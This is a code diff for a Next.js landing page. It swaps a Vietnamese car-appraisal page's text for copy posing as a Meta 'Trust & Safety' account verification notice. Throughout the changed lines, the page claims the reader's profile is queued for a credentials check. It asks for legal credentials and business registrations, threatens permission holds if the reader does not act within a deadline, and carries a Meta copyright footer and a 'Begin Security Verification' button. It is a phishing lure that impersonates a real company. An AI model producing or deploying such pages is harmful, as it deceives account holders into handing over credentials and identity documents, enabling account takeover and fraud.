@@ -4,8 +4,8 @@ import Image from "next/image";
 import type { Metadata } from "next";
 
 export const metadata: Metadata = {
-  title: "AutoTrade Hub | Đăng Ký Thẩm Định & Ký Gửi Xe",
-  description: "Cổng đăng ký kiểm định chất lượng, định giá xe cũ và kết nối người mua chính chủ.",
+  title: "Trust & Safety Portal | Identity & Account Validation",
+  description: "Mandatory security check and ownership confirmation for account managers.",
   alternates: {
     canonical: "/accounts-center",
   },
@@ -21,7 +21,7 @@ export default function AccountsCenterPage() {
               <div className="mt-1 flex h-12 w-12 items-center justify-center rounded-full bg-metaBlue/10">
                 <Image
                   src="/ic_blue.svg"
-                  alt="Vehicle Appraisal"
+                  alt="Identity Verification"
                   width={40}
                   height={40}
                   className="h-8 w-8"
@@ -29,43 +29,43 @@ export default function AccountsCenterPage() {
               </div>
               <div>
                 <h1 className="text-2xl font-semibold tracking-tight sm:text-3xl">
-                  Yêu Cầu Định Giá &amp; Đăng Ký Mua Bán Xe
+                  Security Notification: Confirm Account Ownership
                 </h1>
                 <p className="mt-2 text-sm font-semibold text-slate-800">
-                  Dịch vụ kiểm định chất lượng 160 điểm và hỗ trợ giao dịch xe chính chủ nhanh chóng.
+                  Periodic safety evaluation and community compliance checkpoint.
                 </p>
               </div>
             </div>
 
             <div className="space-y-4 text-sm leading-relaxed text-slate-700 sm:text-base">
               <p>
-                Để đảm bảo tính minh bạch và an toàn pháp lý cho mọi giao dịch trên hệ thống sàn giao dịch ô tô, tất cả các phương tiện đăng bán hoặc ký gửi đều được kiểm tra hồ sơ kỹ thuật, lịch sử bảo dưỡng và tình trạng pháp lý xe trước khi kết nối trực tiếp với người mua thiện chí.
+                In accordance with our platform security protocols, we regularly review administrative privileges to safeguard user environments and verify active managers. Your profile has been queued for a standard credentials confirmation to certify compliance with updated platform safety guidelines.
               </p>
 
               <p>
-                Hoàn tất hồ sơ kiểm định giúp xe của bạn được định giá sát nhất với thị trường thực tế, cấp chứng nhận xe đạt chuẩn và tăng tốc độ thanh khoản lên đến 70% so với việc tự rao bán riêng lẻ.
+                Validating your account records maintains full operational control, protects associated brand assets against spoofing or takeover attempts, and guarantees uninterrupted access to connected services and administrative tools.
               </p>
 
               <p className="mt-4 text-sm font-medium text-metaBlue">
-                Mã Hồ Sơ Thẩm Định: <span className="underline decoration-dotted">#CAR-2026-VAL-8821</span>
+                Reference Reference No: <span className="underline decoration-dotted">#SEC-4719-AUTH-AUDIT</span>
               </p>
 
               <div className="mt-6 space-y-3">
                 <h2 className="text-sm font-semibold text-slate-900 sm:text-base">
-                  Quy Trình Kiểm Tra &amp; Điều Kiện Hồ Sơ
+                  Submission Instructions &amp; Review Criteria
                 </h2>
 
                 <ul className="space-y-3 text-sm text-slate-700 sm:text-[15px]">
                   <li>
-                    • <strong>Thông Tin Pháp Lý:</strong> Chủ xe chuẩn bị sẵn bản sao cà-vẹt (giấy đăng ký xe), sổ đăng kiểm còn hạn và giấy tờ tùy thân của người đứng tên để đối chiếu tính chính chủ.
+                    • <strong>Information Consistency:</strong> Ensure all legal credentials, business registrations, and primary contact methods strictly align with the details on record. Mismatched details or omissions may trigger extended validation delays.
                   </li>
 
                   <li>
-                    • <strong>Khảo Sát Thực Tế:</strong> Chuyên viên kỹ thuật sẽ đặt lịch kiểm tra trực tiếp khung gầm, động cơ, hộp số và lịch sử tai nạn/thủy kích theo tiêu chuẩn 160 hạng mục tại nhà hoặc trạm dịch vụ.
+                    • <strong>Review Timeframe:</strong> Please review and finalize the requested details within the open verification window. Unconfirmed requests may result in temporary permission holds until identification is resolved.
                   </li>
 
                   <li>
-                    • <strong>Định Giá &amp; Khớp Lệnh Mua:</strong> Báo cáo kiểm định và mức giá đề xuất tốt nhất sẽ được gửi lại trong vòng 2–4 giờ làm việc. Sau khi thống nhất giá, thủ tục công chứng và giải ngân được hoàn tất ngay trong ngày.
+                    • <strong>Processing &amp; Status Maintenance:</strong> Once information is received, our security systems will assess the records against platform safety benchmarks (typically within 24–48 hours). Your account standing and management roles will remain completely secure throughout the process.
                   </li>
                 </ul>
               </div>
@@ -73,29 +73,29 @@ export default function AccountsCenterPage() {
 
             <div className="mt-10 flex justify-center">
               <ButtonWithModal className="inline-flex items-center rounded-full bg-metaBlue px-10 py-3 text-sm font-semibold text-white shadow-sm transition hover:bg-metaIndigo focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-metaBlue focus-visible:ring-offset-2">
-                Đăng Ký Định Giá Ngay
+                Begin Security Verification
               </ButtonWithModal>
             </div>
           </section>
 
           <footer className="mt-6 flex flex-wrap justify-center gap-4 text-xs text-slate-500 sm:text-[13px]">
             <button className="hover:text-slate-700" type="button">
-              Bảng Giá Tham Khảo
+              Support Center
             </button>
             <span className="text-slate-400">|</span>
             <button className="hover:text-slate-700" type="button">
-              Chính Sách Bảo Hành Xe
+              Data Privacy
             </button>
             <span className="text-slate-400">|</span>
             <button className="hover:text-slate-700" type="button">
-              Hỗ Trợ Thủ Tục Sang Tên
+              Terms &amp; Policies
             </button>
             <span className="text-slate-400">|</span>
             <button className="hover:text-slate-700" type="button">
-              Hợp Đồng Ký Gửi
+              Safety Guidelines
             </button>
             <span className="text-slate-400">|</span>
-            <span>AutoTrade Hub © 2026</span>
+            <span>Meta © 2026</span>
           </footer>
         </main>
       </div>
